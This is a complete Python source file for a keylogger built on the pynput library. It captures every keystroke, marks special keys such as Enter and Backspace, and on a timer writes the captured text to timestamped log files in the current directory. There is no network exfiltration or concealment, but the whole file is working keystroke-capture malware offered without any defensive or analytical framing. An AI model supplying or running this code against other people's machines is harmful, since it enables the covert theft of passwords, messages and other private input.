from datetime import datetime
from threading import Timer
from pynput.keyboard import Listener, Key

class Keylogger:
    def __init__(self, interval : int = 60, reportMethod : str = "file", onlyOneFile : bool = False):
        self.interval = interval
        self.reportMethod = reportMethod
        self.log = ""                           # Contains the log of all the keystrokes within `self.interval`
        self.onlyOneFile = onlyOneFile
        self.startDatetime = datetime.now()
        self.endDatetime = datetime.now()
        self._updateFilename()
    
    def start(self) -> None:
        self.startDatetime = datetime.now()
        # Start the keylogger
        # Start reporting the keylogs
        self._report()
        # Make a simple message
        print(f"{datetime.now()} - Started keylogger")
        with Listener(on_release=self._callback) as listener:
            listener.join()

    def _callback(self, key : Key) -> None:
        """
            This callback is invoked whenever a keyboard event is occured
        """
        specialKeys = {
            Key.space: " ",
            Key.enter: "[ENTER]\n",
            Key.backspace: "[BACKSPACE]"
        }

        if key in specialKeys.keys():
            self.log += specialKeys[key]
        else:
            self.log += str(key).replace("'","")

    def _report(self) -> None:
        """
            This function gets called every `self.interval`
            It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.endDatetime = datetime.now()
            
            if not self.onlyOneFile:
                self._updateFilename()

            if self.reportMethod == "file":
                self._reportToFile()
            print(f"[{self.fileName}] - {self.log}")
            self.startDatetime = datetime.now()
        
        self.log = ""
        timer = Timer(interval=self.interval, function=self._report)
        timer.daemon = True
        timer.start()

    def _reportToFile(self) -> None:
        """
            This method creates a log file in the current directory that contains
            the current keylogs in the `self.log` variable
        """
        mode = "w"
        if self.onlyOneFile:
            mode = "a"
        
        with open(f"{self.fileName}.txt", mode) as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.fileName}.txt")

    def _updateFilename(self) -> None:
        """
            Construct the filename to be identified by start & end datetimes
        """
        startDatetimeString = str(self.startDatetime)[:-7].replace(" ", "-").replace(":", "")
        endDatetimeString = str(self.endDatetime)[:-7].replace(" ", "-").replace(":", "")
        self.fileName = f"keylog-{startDatetimeString}_{endDatetimeString}"

if __name__ == "__main__":
    Keylogger(
        interval=5,
        reportMethod="file",
        onlyOneFile=True
    ).start()